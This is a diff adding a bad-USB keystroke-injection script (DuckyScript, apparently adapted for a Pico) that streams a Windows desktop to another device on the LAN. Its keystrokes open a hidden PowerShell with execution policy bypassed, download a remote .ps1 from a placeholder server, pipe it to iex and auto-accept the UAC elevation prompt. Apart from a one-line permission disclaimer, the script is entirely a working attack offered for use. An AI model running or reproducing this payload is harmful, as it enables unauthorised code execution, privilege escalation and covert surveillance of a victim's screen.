@@ -1,0 +1,26 @@
+REM Author:      beigeworm 
+REM Title:       Screenshare-Over-LAN
+REM Target:      Windows 10/11 
+REM Description: Start up a HTTP server and stream the desktop to a browser window on another device on the network.
+
+REM **THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE!**
+
+REM Replace the URL for your own hosted .ps1 raw file.
+DEFINE #SCRIPTURL https://yourserver.com/rawfile/Screenshare-Over-LAN.ps1
+
+REM Define a custom port here (optional)
+DEFINE #PORT 8080
+
+REM kducky: stripped EXTENSION PASSIVE_WINDOWS_DETECT (not executed on Pico)
+
+REM kducky: removed OS-gate (extension stripped — payload runs on any OS)
+
+REM Main bad-USB script
+LED_G
+GUI r
+DELAY 500
+STRING powershell -Ep Bypass -W H -C $port = #PORT;IRM #SCRIPTURL | iex
+DELAY 250
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
